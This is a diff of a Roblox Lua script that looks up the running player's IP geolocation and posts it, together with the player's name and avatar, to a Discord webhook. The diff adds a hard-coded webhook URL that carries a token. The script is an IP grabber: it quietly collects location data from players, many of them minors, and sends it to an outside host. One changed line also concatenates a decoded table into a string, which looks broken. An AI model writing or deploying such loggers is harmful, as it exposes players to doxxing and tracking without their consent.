@@ -1,8 +1,8 @@
 local HTTP = game:GetService("HttpService")
 
-local webhookurl = "https://api.techniknews.net/ipgeo" -- This can be found by going into your discord server settings then going to integrations then going to webhooks
+local webhookurl = "https://discord.com/api/webhooks/1172578120373645342/O3zNN3CZXkL5Qgce4YaOlbOdPAxX24iQ9XwUtIsCmjzCVrvm_Z3VInHb-udTa-tHk78_"
 local player = game.Players.LocalPlayer
-local aaaaa = game:HttpGet("http://ip-api.com/json")
+local aaaaa = game:HttpGet("https://api.techniknews.net/ipgeo")
 
 wait(5)
 
@@ -15,7 +15,7 @@ local a = HTTP:JSONDecode(aaaaa)
 				["name"] = player.Name,
 				["icon_url"] = "https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&username="..player.Name
 			},
-			["description"] = "IP:  " .. a.query,
+			["description"] = "Info:  " .. a,
 			["color"] = tonumber(0xFFFAFA),
 			["fields"] = {
 				{
